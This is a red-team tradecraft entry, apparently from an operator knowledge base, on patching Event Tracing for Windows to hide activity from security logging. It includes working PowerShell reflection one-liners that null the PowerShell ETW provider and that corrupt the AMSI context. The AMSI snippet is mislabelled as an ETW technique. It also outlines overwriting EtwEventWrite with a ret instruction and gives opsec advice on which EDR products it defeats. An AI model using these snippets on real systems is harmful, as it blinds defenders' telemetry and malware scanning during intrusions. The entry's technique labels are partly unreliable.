---
name: ETW Patching (BOF and .NET)
category: defense-evasion
subcategories: [etw-patch, telemetry-suppression, event-tracing]
tradecraft_tags: [etw, patch, telemetry, defense-evasion, bof, dotnet, logging-suppression]
mitre_attack:
  - id: T1562.006
    name: Impair Defenses — Indicator Blocking
source:
  url: https://github.com/benpturner/PoshC2/blob/master/resources/modules/ETWPatch.ps1
  license: Unknown
  maintained: false
binary_type: bof
binary_filename: ETWpatch.x64.o
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  ETW patching writes to ntdll.dll or EtwEventWrite in the current process memory.
  Memory writes to ntdll's EtwEventWrite function are detectable by kernel-level EDR
  with memory integrity checks (CrowdStrike, SentinelOne protect ntdll against writes
  via kernel callbacks). Memory scanning detecting patches to EtwEventWrite is the
  primary detection path. ETW patching is NOT invisible to kernel-level security.
usage_examples:
  - description: Patch ETW in current process to suppress .NET assembly telemetry
    args: "execute-bof ETWpatch.x64.o"
  - description: Patch ETW via PowerShell reflection (pre-operation, requires AMSI bypass first)
    args: "[Reflection.Assembly]::LoadWithPartialName('System.Core'); $a=[ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'); $b=$a.GetField('etwProvider','NonPublic,Static').GetValue($null); [Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp'); $t=$b.GetType(); $f=$t.GetField('m_provider','Instance,NonPublic'); $f.SetValue($b,[IntPtr]::Zero)"
opsec_notes: |
  ETW patching suppresses Event Tracing for Windows telemetry from the current process.
  This reduces visibility into .NET assembly execution, module loads, and other
  in-process events that ETW providers emit. However:
  1. Kernel-level EDR protects ntdll.dll against user-mode writes
  2. The patching attempt itself may be logged before the patch takes effect
  3. ETW patching only affects the CURRENT process — doesn't suppress telemetry
     from other processes (e.g. a child process spawned after patching)
  For Apollo operations, ETW patching in the agent process may reduce .NET
  assembly telemetry but will not help against kernel-level EDR.
gotchas: |
  ETW patching is an arms race — it works against some EDR configurations but not
  others. Modern kernel-level EDR (CrowdStrike Falcon, SentinelOne with KSPU)
  detects and prevents user-mode ntdll writes. Consider whether ETW patching
  is worth the detection risk of the patching attempt itself. BOF-based ETW
  patching (from within the agent process, in-process) is cleaner than spawning
  a separate process to patch.
related_ttps: [amsi-bypass, process-injection, bofnet, trustedsec-bofs]
alternatives: [process-injection-target-selection, amsi-bypass, use-bofs-instead]
common_args: {}
last_updated: 2026-05-29
---

# ETW Patching (BOF and .NET)

Event Tracing for Windows (ETW) patching suppresses telemetry from the current
process by overwriting the `EtwEventWrite` function in ntdll.dll with a return
instruction (`ret`). This prevents the process from emitting ETW events — reducing
visibility for AMSI scan results, .NET assembly loads, and other runtime telemetry.

## ETW Patching Techniques

### 1. Direct ntdll patch (BOF, most effective in-process)
```c
// Set NtProtectVirtualMemory on ntdll.EtwEventWrite region to RWX
// Write 0xC3 (ret) to EtwEventWrite entry point
// Restore page protection
```

### 2. PowerShell provider null (for PS telemetry)
```powershell
# Null the PS ETW provider (suppresses PS block/script logging):
[Reflection.Assembly]::LoadWithPartialName('System.Core')
$a=[ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$b=$a.GetField('etwProvider','NonPublic,Static').GetValue($null)
$t=$b.GetType(); $f=$t.GetField('m_provider','Instance,NonPublic')
$f.SetValue($b,[IntPtr]::Zero)
```

### 3. ETW registration handle null (.NET AMSI provider)
```powershell
# Target the AMSI ETW provider registration:
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
[System.Runtime.InteropServices.Marshal]::WriteByte($b.GetValue($null), 0x0)
```

## What ETW Patching Suppresses (when it works)

- **Script Block Logging** events (Event 4104) — PS script content
- **.NET assembly load events** — which assemblies are being loaded
- **AMSI scan submission events** — what content AMSI is scanning
- **Module load telemetry** — DLL load notifications

## What It Does NOT Suppress

- **Windows Security Event Log** (separate mechanism — SACL/audit)
- **Sysmon events** (kernel driver, separate from ETW providers)
- **EDR kernel callbacks** (ObRegisterCallbacks, PsSet*NotifyRoutine)
- **Network connections** (network stack monitoring is separate)

## Practical Guidance

In environments with modern kernel-level EDR:
- ETW patching has limited value — kernel protection prevents the write
- The patching ATTEMPT may itself trigger an alert
- Focus on avoiding the need for ETW suppression by using BOFs (already low telemetry)
  and properly-named processes

ETW patching is most effective against:
- Older EDR that relies heavily on ETW telemetry
- Script block logging suppression before running PowerShell-based tools
- Environments without kernel-level EDR protection
